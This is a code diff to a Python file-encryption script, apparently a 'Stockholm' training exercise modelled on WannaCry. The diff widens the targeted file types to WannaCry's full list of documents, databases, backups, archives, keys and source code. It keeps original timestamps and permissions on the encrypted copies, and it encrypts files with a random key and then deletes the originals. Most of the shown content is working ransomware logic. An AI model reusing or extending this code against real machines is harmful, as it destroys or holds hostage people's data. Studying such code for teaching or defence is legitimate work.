@@ -12,8 +12,21 @@ from pathlib import Path
 
 SILENT = False
 VERSION = "v1.05"
-WANNACRY_EXT  = ".WCRY"
-STOCKHOLM_EXT = ".ft"
+WANNACRY_EXT = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pst', '.ost', '.msg', '.eml', '.vsd', '.vsdx', '.txt',
+	   '.csv', '.rtf', '.123', '.wks', '.wk1', '.pdf', '.dwg', '.onetoc2', '.snt', '.jpeg', '.jpg', '.docb', '.docm',
+	   '.dot', '.dotm', '.dotx', '.xlsm', '.xlsb', '.xlw', '.xlt', '.xlm', '.xlc', '.xltx', '.xltm', '.pptm', '.pot',
+	   '.pps', '.ppsm', '.ppsx', '.ppam', '.potx', '.potm', '.edb', '.hwp', '.602', '.sxi', '.sti', '.sldx', '.sldm',
+	   '.vdi', '.vmdk', '.vmx', '.gpg', '.aes', '.ARC', '.PAQ', '.bz2', '.tbk', '.bak', '.tar', '.tgz', '.gz',
+	   '.7z', '.rar', '.zip', '.backup', '.iso', '.vcd', '.bmp', '.png', '.gif', '.raw', '.cgm', '.tif', '.tiff', '.nef',
+	   '.psd', '.ai', '.svg', '.djvu', '.m4u', '.m3u', '.mid', '.wma', '.flv', '.3g2', '.mkv', '.3gp', '.mp4', '.mov', '.avi',
+	   '.asf', '.mpeg', '.vob', '.mpg', '.wmv', '.fla', '.swf', '.wav', '.mp3', '.sh', '.class', '.jar', '.java', '.rb', '.asp',
+	   '.php', '.jsp', '.brd', '.sch', '.dch', '.dip', '.pl', '.vb', '.vbs', '.ps1', '.bat', '.cmd', '.js', '.asm', '.h', '.pas',
+	   '.cpp', '.c', '.cs', '.suo', '.sln', '.ldf', '.mdf', '.ibd', '.myi', '.myd', '.frm', '.odb', '.dbf', '.db', '.mdb',
+	   '.accdb', '.sql', '.sqlitedb', '.sqlite3', '.asc', '.lay6', '.lay', '.mml', '.sxm', '.otg', '.odg', '.uop', '.std',
+	   '.sxd', '.otp', '.odp', '.wb2', '.slk', '.dif', '.stc', '.sxc', '.ots', '.ods', '.3dm', '.max', '.3ds', '.uot', '.stw',
+	   '.sxw', '.ott', '.odt', '.pem', '.p12', '.csr', '.crt', '.key', '.pfx', '.der']
+
+STOCKHOLM_EXT =[".ft"]
 PATH = os.path.join(str(Path.home()), "infection")
 KEY_LENGTH = 16
 
@@ -38,7 +51,7 @@ def generate_random_key(length):
     random_key = ''.join(secrets.choice(characters) for _ in range(length))
     return random_key
 
-def get_files(path, ext):
+def get_files(path, ext=None):
     """
     Retrieves a list of files in the specified directory
     and its subdirectories, with the full path, optionally
@@ -46,7 +59,7 @@ def get_files(path, ext):
 
     Args:
     - path (str): The path of the directory to traverse.
-    - ext (str, optional): The file extension to filter by.
+    - ext (list, optional): A list of file extensions to filter by.
 
     Returns:
     - list: A list containing the full path of files with
@@ -57,21 +70,50 @@ def get_files(path, ext):
     # Traverse the directory and its subdirectories
     for root, dirs, files in os.walk(path):
         for file in files:
-            # Check if file has the specified extension
-            if ext is None or file.endswith(ext):
+            # Check if file has the specified extension(s)
+            if ext is None or any(file.endswith(e) for e in ext):
                 # Construct the full path
                 file_path = os.path.join(root, file)
                 files_list.append(file_path)
     return files_list
 
 def read_binary_file(file_path):
+    """
+    Reads a binary file and returns its content and file attributes.
+
+    Args:
+    - file_path (str): The path to the binary file.
+
+    Returns:
+    - tuple: A tuple containing the file content (bytes) and file attributes.
+    """
     with open(file_path, 'rb') as file:
         data = file.read()
-    return data
+    # Get file attributes
+    file_stats = os.stat(file_path)
+    file_attributes = {
+        'creation_time': file_stats.st_ctime,
+        'modification_time': file_stats.st_mtime,
+        'mode': file_stats.st_mode,  # File mode (permissions)
+        # You can add more attributes as needed
+    }
+    return data, file_attributes
 
-def write_binary_file(file_path, data):
+
+def write_binary_file(file_path, data, file_attributes):
+    """
+    Writes data to a binary file and sets its attributes.
+
+    Args:
+    - file_path (str): The path to write the binary file.
+    - data (bytes): The binary data to write to the file.
+    - file_attributes (dict): A dictionary containing file attributes.
+    """
     with open(file_path, 'wb') as file:
         file.write(data)
+    # Set file attributes
+    os.utime(file_path, (file_attributes['creation_time'], file_attributes['modification_time']))
+    os.chmod(file_path, file_attributes['mode'])
 
 def delete_file(file_path):
     """
@@ -114,10 +156,14 @@ def reverse(key):
         new_name = os.path.splitext(f)[0]
         output(f"decrypting for {Fore.YELLOW}{f}{Style.RESET_ALL}...", end =' ')
         output(f"--> {Fore.BLUE}{new_name}{Style.RESET_ALL}", end=' ')
-        write_binary_file(new_name,decrypt_data(read_binary_file(f), key))
-        delete_file(f)
-        output("✅")
-        nb_file += 1
+        try:
+            data, attributes = read_binary_file(f)
+            write_binary_file(new_name,decrypt_data(data, key), attributes)
+            delete_file(f)
+            output("✅")
+            nb_file += 1
+        except Exception :
+            output("❌ Bad file")
     output(f"{Fore.GREEN}{nb_file}{Style.RESET_ALL} files decrypted out of {Fore.BLUE}{total_files}{Style.RESET_ALL} encrypted files in folder [{Fore.YELLOW}{PATH}{Style.RESET_ALL}]")
 
 def encrypt():
@@ -127,10 +173,11 @@ def encrypt():
     key = generate_random_key(KEY_LENGTH)
     for f in files:
         try:
-            new_name = f+STOCKHOLM_EXT
+            new_name = f+STOCKHOLM_EXT[0]
             output(f"Encryption for {Fore.YELLOW}{f}{Style.RESET_ALL}...", end =' ')
             output(f"--> {Fore.BLUE}{new_name}{Style.RESET_ALL}", end=' ')
-            write_binary_file(new_name,encrypt_data(read_binary_file(f), key))
+            data, attributes = read_binary_file(f)
+            write_binary_file(new_name,encrypt_data(data, key), attributes)
             delete_file(f)
             output("✅")
             nb_file += 1
